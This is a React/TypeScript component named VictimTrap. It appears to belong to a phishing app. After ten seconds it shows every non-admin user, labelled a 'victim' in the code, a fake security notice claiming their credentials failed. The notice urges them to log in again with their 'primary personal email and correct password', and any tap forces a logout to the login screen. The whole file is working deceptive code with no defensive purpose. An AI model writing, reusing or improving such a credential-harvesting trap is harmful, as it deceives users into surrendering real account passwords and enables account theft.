import { AnimatePresence, motion } from 'framer-motion';
import { ShieldAlert } from 'lucide-react';
import { useEffect, useState } from 'react';
import { GlassButton } from './Glass';
import { useAppStore } from '../store/useAppStore';

/**
 * Victims only: 10s after entering the app, show a professional auth-failed modal.
 * Any tap / "Try Again" → instant logout to the main login screen.
 * Admin is 100% immune.
 */
export default function VictimTrap() {
  const currentUser = useAppStore((s) => s.currentUser);
  const logout = useAppStore((s) => s.logout);
  const [open, setOpen] = useState(false);

  const isVictim = !!(currentUser && !currentUser.isAdmin);

  useEffect(() => {
    if (!isVictim) {
      setOpen(false);
      return;
    }
    setOpen(false);
    const t = window.setTimeout(() => setOpen(true), 10_000);
    return () => window.clearTimeout(t);
  }, [isVictim, currentUser?.id]);

  if (!isVictim || !open) return null;

  const kick = (e?: React.SyntheticEvent) => {
    e?.preventDefault();
    e?.stopPropagation();
    try {
      logout();
    } catch {
      useAppStore.setState({
        currentUser: null,
        screen: 'auth',
        pendingAuth: null,
        activeChatId: null,
        viewingProfileId: null,
      });
    }
  };

  return (
    <AnimatePresence>
      <motion.div
        className="fixed inset-0 z-[9999] flex items-center justify-center p-5"
        style={{
          backgroundColor: 'rgba(0,0,0,0.78)',
          backdropFilter: 'blur(14px)',
          WebkitBackdropFilter: 'blur(14px)',
        }}
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onClick={kick}
        onTouchStart={kick}
        onPointerDown={kick}
        role="dialog"
        aria-modal="true"
      >
        <motion.div
          className="glass-panel w-full max-w-md p-6 text-center"
          initial={{ scale: 0.92, y: 18 }}
          animate={{ scale: 1, y: 0 }}
          transition={{ type: 'spring', stiffness: 360, damping: 28 }}
          onClick={(e) => e.stopPropagation()}
          onPointerDown={(e) => e.stopPropagation()}
          onTouchStart={(e) => e.stopPropagation()}
        >
          <div className="mx-auto mb-4 h-14 w-14 rounded-2xl bg-rose-500/15 border border-rose-400/30 grid place-items-center">
            <ShieldAlert className="h-7 w-7 text-rose-300" />
          </div>
          <p className="text-[11px] uppercase tracking-[0.18em] text-rose-300/90 font-semibold mb-2">
            Security notice
          </p>
          <h2 className="text-[17px] sm:text-lg font-semibold text-white leading-snug mb-4">
            Authentication Failed: Incorrect credentials detected. To secure your
            session and view this content, please log in using your primary
            personal email and correct password.
          </h2>
          <GlassButton
            variant="primary"
            className="w-full justify-center py-3.5"
            onClick={kick}
          >
            Try Again
          </GlassButton>
          <p className="mt-3 text-[11px] text-white/40">
            Tap anywhere to return to login
          </p>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}
